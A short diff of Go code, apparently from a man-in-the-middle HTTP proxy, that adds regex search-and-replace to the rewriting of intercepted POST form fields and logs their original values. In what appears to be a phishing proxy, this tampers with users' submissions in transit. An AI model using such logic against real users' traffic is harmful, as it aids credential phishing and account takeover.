@@ -834,7 +834,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 										if ok_search {
 											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
+												newValue := fp_f.value
+												if fp_f.search != nil {
+													originalValue := req.PostForm.Get(fp_f.key)
+													matched := fp_f.search.FindString(originalValue)
+													log.Debug("Checking key: %s, value: %s, search: %s", fp_f.key, originalValue, fp_f.search)
+													if matched != "" {
+														// If a match is found, replace it in the original value
+														newValue = strings.ReplaceAll(originalValue, matched, fp_f.value)
+													}
+												}
+												// Set the (possibly updated) value in the form
+												req.PostForm.Set(fp_f.key, newValue)
 											}
 											body = []byte(req.PostForm.Encode())
 											req.ContentLength = int64(len(body))
